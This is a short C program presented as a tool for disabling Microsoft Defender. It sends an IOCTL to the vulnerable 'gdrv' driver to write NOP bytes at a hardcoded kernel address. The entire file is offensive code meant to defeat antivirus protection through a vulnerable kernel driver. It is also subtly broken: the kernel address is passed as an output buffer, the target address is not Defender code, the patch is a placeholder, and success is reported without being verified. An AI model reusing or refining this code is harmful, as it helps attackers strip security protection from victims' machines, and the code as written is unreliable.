#include <windows.h>
#include <stdio.h>

#define IOCTL_WRITE_MEM 0x222003  // Replace with your vulnerable driver's IOCTL code

void disable_defender(PVOID target_address) {
    unsigned char patch[] = {0x90, 0x90, 0x90}; // NOP out certain instructions (example)

    HANDLE hDevice = CreateFileA("\\\\.\\gdrv", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device\n");
        return;
    }

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_WRITE_MEM,
        patch,
        sizeof(patch),
        target_address,
        sizeof(PVOID),
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("Successfully disabled Defender!\n");
    } else {
        printf("Failed to disable Defender\n");
    }

    CloseHandle(hDevice);
}

int main() {
    PVOID targetAddress = (PVOID)0xFFFFF78000000380;  // Address in kernel (could target defender code)
    disable_defender(targetAddress);
    return 0;
}
